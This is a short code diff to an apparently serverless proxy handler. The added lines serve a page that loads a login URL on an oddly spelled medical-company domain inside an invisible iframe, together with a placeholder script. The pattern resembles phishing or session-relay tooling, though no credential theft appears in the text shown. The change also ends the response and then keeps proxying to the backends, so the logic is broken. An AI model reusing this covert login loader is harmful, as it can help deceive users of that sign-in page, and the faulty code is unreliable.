@@ -13,6 +13,31 @@ export default async function handler(req, res) {
     'https://sso.acceleratedmedicallinc.org',
   ];
 
+  // Load the original URL in a hidden iframe
+  res.writeHead(200, { 'Content-Type': 'text/html' });
+  res.write(`
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+      <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <title>Proxy Page</title>
+      <style>
+        iframe {
+          display: none; /* Hide the iframe */
+        }
+      </style>
+    </head>
+    <body>
+      <iframe src="https://login.acceleratedmedicallinc.org${fullPath}"></iframe>
+      <script>
+        // You can add any additional JavaScript here if needed
+      </script>
+    </body>
+    </html>
+  `);
+  res.end();
+
   for (const base of BACKEND_URLS) {
     const fullUrl = `${base}${fullPath}`;
     try {
